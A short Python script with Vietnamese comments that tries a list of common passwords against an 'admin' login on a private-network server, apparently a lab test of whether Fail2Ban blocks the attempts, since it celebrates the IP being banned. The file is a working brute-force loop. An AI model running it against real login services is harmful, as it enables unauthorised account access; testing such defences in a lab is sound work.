import requests
import time

# IP mình lấy từ ảnh màn hình của bạn
URL = "http://192.168.238.151:3000/login-secure" 

# Danh sách mật khẩu sai để thử
PASSWORDS = ["123456", "password", "admin", "qwerty", "wrongpass", "test", "abc"]

print(f"--- BẮT ĐẦU TẤN CÔNG BRUTE-FORCE VÀO: {URL} ---")

for i, pwd in enumerate(PASSWORDS): 
    try:
        print(f"[Lần thử {i+1}] Đang thử pass: {pwd} ...")
        
        # Gửi request đăng nhập (timeout 2s để không bị treo nếu mạng lag)
        response = requests.post(URL, json={"username": "admin", "password": pwd}, timeout=2)
        
        if response.status_code == 200:
            print(">>> THÀNH CÔNG! Đã tìm thấy mật khẩu.")
            break
        elif response.status_code == 401:
            print("--> Sai mật khẩu (Server trả về 401).")
        else:
            print(f"--> Mã phản hồi khác: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("\n>>> KẾT NỐI BỊ TỪ CHỐI!")
        print(">>> CHÚC MỪNG! Fail2Ban đã chặn IP của bạn thành công.")
        print(">>> (Bạn không thể truy cập server này nữa).")
        break
    except Exception as e:
        print(f"Lỗi khác: {e}")
    
    # Nghỉ 0.5 giây giữa các lần thử để server kịp ghi log
    time.sleep(0.5)
